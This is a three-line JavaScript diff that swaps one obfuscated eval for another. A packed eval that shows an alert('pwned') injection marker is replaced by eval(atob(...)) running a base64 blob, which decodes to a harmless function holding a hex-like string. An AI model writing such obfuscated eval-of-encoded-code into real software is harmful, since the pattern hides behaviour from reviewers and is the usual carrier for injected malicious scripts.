@@ -1,3 +1,1 @@
-eval(function(p,a,c,k,e,d){
-while(c--)if(k[c])p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c]);
-return p}('0("1")',2,2,'alert|pwned'.split('|'),0,{}))
+eval(atob("ZnVuY3Rpb24gXzB4MWZlKCkge3ZhciBhPSJ4YjJmYzM0NjA5ZjU0NmM5NzA3ODNhNDQ5OTI4MWY0ODAwOWE2ODQxODhjYjczYmE3YjNiNmQ1ZjU1NzZlMWQ5MGRmYjAyMjNlODdmZjE3NDVhNTg2Njc1NjYxNDZkZWI1ODBhOTM0YzZhZTkxZjI0NzJhMjQ2NTRhZTk5YzJhYmM4NTZkMTk1ZDI1OWVhODZjOTFjZmY4YjVmNjAyNzQzMWNjOTUzNzM1ZmY2NTM1NjE1Y2M2NTdlNzA1ZTMxM2JiNzdkZDM2YWE3NjE4MjQxMmZmN2RmMjRkOTVmZmI1NzFkIn07XzB4MWZlKCk7"));
